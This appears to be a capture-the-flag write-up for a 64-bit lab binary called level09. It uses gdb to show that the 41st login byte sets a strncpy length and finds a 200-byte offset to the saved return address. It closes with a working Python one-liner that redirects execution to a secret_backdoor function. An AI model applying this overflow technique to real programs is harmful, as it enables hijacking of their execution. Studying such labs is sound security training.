# level09
!! The binary is 64 bits !!  
The program waits for two inputs: `login` and `msg`

## Step 1: Understand the program

The two inputs are enter using `fgets`. Then the two inputs are stored in an other locations using two methods:

#### Login input:
The first 41 bytes are newly stored in a static buffer at `login + 140`

#### Message input:
The second input is copied at `login` using `strncpy`. The lenght of the copy is the value stored at the `login[180]`.


## Vulnerability
The `41th bytes` of the login input (login[180]) is the length of the `strncpy`. So, we can change the size of `strncpy` of the message input through the login input.

## Go deeper:
Once `set_msg` is called
```console
(gdb) b *set_msg
(gdb) b *set_msg+153
(gdb) r
>: Enter your username
>>: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
(gdb) x/s $rsp+148
0x7fffffffe55c:	 'A' <repeats 41 times>
```

- buffer `login + 140` is at `0x7fffffffe55c`
- size is 41 whereas I entered more characters. (it's the relocation)
---
```console
(gdb) c
>: Msg @Unix-Dude
>>: CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
(gdb) x/s 0x7fffffffe55c-140
0x7fffffffe4d0:	 'C' <repeats 65 times>
```

Good : the second input has been copied into `login` at `0x7fffffffe4d0` with the size __65__.

> 'A' == 65 in decimal

## Step 3: Try to segfault

By setting the maximal size to `strncpy` (256 == 0xFF). we will try to segfault the program.

```bash
(python -c 'print "run" + "\n" + "C" * 40 + "\xff" + "\n" + "B" * 1000') | gdb ./level09
```

```console
Program received signal SIGSEGV, Segmentation fault.
0x0000555555554931 in handle_msg ()
```

We don't know exactly where the program crashed. But it is in `handle_msg`. 

```console
(gdb) i f
Stack level 0, frame at 0x7fffffffe5a0:
 rip = 0x5555555548c4 in handle_msg; saved rip 0x555555554abd
 called by frame at 0x7fffffffe5b0
 Arglist at 0x7fffffffe590, args:
 Locals at 0x7fffffffe590, Previous frame's sp is 0x7fffffffe5a0
 Saved registers:
  rbp at 0x7fffffffe590, rip at 0x7fffffffe598
```

```console
(gdb) p  0x7fffffffe598 - 0x7fffffffe4d0
$6 = 200
```

The strncpy overwrite the `saved rip`: return of `handle_msg` at `0x7fffffffe598`.

Offset is 200 bytes.

## Step 4: Secret backdoor

A function `secret_backdoor` is present and run a desired command.

```bash
gdb ./level09
(gdb) start
(gdb) i functions
```

```console
0x000055555555488c  secret_backdoor
```

secret_backdoor is at `0x000055555555488c`


## Exploit

```bash
(python -c 'print("a" * 40 + "\xff" + "\n" + 200 * "b" + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])'; cat) | /home/users/level09/level09
```